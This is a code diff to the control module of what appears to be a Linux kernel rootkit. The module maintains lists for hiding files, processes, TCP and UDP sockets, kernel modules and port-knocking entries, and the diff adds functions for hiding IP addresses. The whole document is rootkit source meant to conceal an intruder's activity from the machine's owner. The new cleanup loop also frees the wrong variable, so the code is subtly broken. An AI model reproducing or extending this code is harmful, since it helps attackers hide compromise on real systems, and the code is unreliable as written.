@@ -12,6 +12,7 @@ static struct list_head prefixes;
 static struct list_head processes;
 static struct list_head tcp_sockets;
 static struct list_head udp_sockets;
+static struct list_head hidden_ips;
 static struct list_head modules;
 static struct list_head port_knocking_enabled;
 
@@ -45,7 +46,7 @@ hide_file_path(char *name)
 	}
 	
 	if(is_path_hidden(name)) {
-		return -1;	// TODO: better error code
+		return -EINVAL;
 	}
 
 	new = kmalloc(sizeof(struct file_name), GFP_KERNEL);
@@ -114,7 +115,7 @@ hide_file_prefix(char *name)
 	}
 	
 	if(is_prefix_hidden(name)) {
-		return -1;	// TODO: better error code
+		return -EINVAL;
 	}
 
 	new = kmalloc(sizeof(struct file_prefix), GFP_KERNEL);
@@ -122,7 +123,7 @@ hide_file_prefix(char *name)
 		return -ENOMEM;
 	}
 	
-	strncpy(new->name, name, 1023);
+	strncpy(new->name, name, 63);
 
 	list_add(&new->list, &prefixes);
 	
@@ -168,7 +169,7 @@ hide_process(pid_t pid)
 	struct process *new;
 	
 	if(is_process_hidden(pid)) {
-		return -1;	// TODO: better error code
+		return -EINVAL;
 	}
 
 	new = kmalloc(sizeof(struct process), GFP_KERNEL);
@@ -223,7 +224,7 @@ hide_tcp_socket(int port)
 	struct tcp_socket *new;
 	
 	if(is_tcp_socket_hidden(port)) {
-		return -1;	// TODO: better error code
+		return -EINVAL;
 	}
 
 	new = kmalloc(sizeof(struct tcp_socket), GFP_KERNEL);
@@ -278,7 +279,7 @@ hide_udp_socket(int port)
 	struct udp_socket *new;
 	
 	if(is_udp_socket_hidden(port)) {
-		return -1;	// TODO: better error code
+		return -EINVAL;
 	}
 
 	new = kmalloc(sizeof(struct udp_socket), GFP_KERNEL);
@@ -301,6 +302,61 @@ unhide_udp_socket(int port)
 	list_for_each_safe(cursor, next, &udp_sockets) {
 		cur = list_entry(cursor, struct udp_socket, list);
 		if(cur->port == port) {
+			list_del(cursor);
+			kfree(cur);
+			return 0;
+		}
+	}
+
+	
+	return -EINVAL;
+}
+
+int
+is_ip_hidden(__u32 ipaddr)
+{
+	struct hidden_ip *cur;
+	struct list_head *cursor;
+	
+	list_for_each(cursor, &hidden_ips) {
+		cur = list_entry(cursor, struct hidden_ip, list);
+		if(cur->ipaddr == ipaddr) {
+			return 1;
+		}
+	}
+
+	return 0;
+}
+
+int
+hide_ip_address(__u32 ipaddr)
+{
+	struct hidden_ip *new;
+	
+	if(is_ip_hidden(ipaddr)) {
+		return -EINVAL;
+	}
+
+	new = kmalloc(sizeof(struct hidden_ip), GFP_KERNEL);
+	if(new == NULL) {
+		return -ENOMEM;
+	}
+	
+	new->ipaddr = ipaddr;
+
+	list_add(&new->list, &hidden_ips);
+	
+	return 0;
+}
+
+int
+unhide_ip_address(__u32 ipaddr)
+{
+	struct hidden_ip *cur;
+	struct list_head *cursor, *next;
+	list_for_each_safe(cursor, next, &hidden_ips) {
+		cur = list_entry(cursor, struct hidden_ip, list);
+		if(cur->ipaddr == ipaddr) {
 			list_del(cursor);
 			kfree(cur);
 			return 0;
@@ -343,7 +399,7 @@ hide_module(char *name)
 	}
 	
 	if(is_module_hidden(name)) {
-		return -1;	// TODO: better error code
+		return -EINVAL;
 	}
 
 	new = kmalloc(sizeof(struct modules), GFP_KERNEL);
@@ -406,7 +462,7 @@ filter_port(int port, int protocol, __u32 ipaddr)
 	}
 	
 	if(is_port_filtered(port, protocol, 0x00000000)) {
-		return -1;	// TODO: better error code
+		return -EINVAL;
 	}
 
 	new = kmalloc(sizeof(struct port_knocking), GFP_KERNEL);
@@ -451,6 +507,7 @@ initialize_control(void)
 	INIT_LIST_HEAD(&processes);
 	INIT_LIST_HEAD(&tcp_sockets);
 	INIT_LIST_HEAD(&udp_sockets);
+	INIT_LIST_HEAD(&hidden_ips);
 	INIT_LIST_HEAD(&modules);
 	INIT_LIST_HEAD(&port_knocking_enabled);
 
@@ -468,6 +525,7 @@ cleanup_control(void)
 	struct process *process;
 	struct tcp_socket *tcp;
 	struct udp_socket *udp;
+	struct hidden_ip *ip;
 	struct modules *module;
 	struct port_knocking *knocked_port;
 	
@@ -502,6 +560,13 @@ cleanup_control(void)
 	cursor = next = NULL;
 	list_for_each_safe(cursor, next, &udp_sockets) {
 		udp = list_entry(cursor, struct udp_socket, list);
+		list_del(cursor);
+		kfree(udp);
+	}
+	
+	cursor = next = NULL;
+	list_for_each_safe(cursor, next, &hidden_ips) {
+		ip = list_entry(cursor, struct hidden_ip, list);
 		list_del(cursor);
 		kfree(udp);
 	}
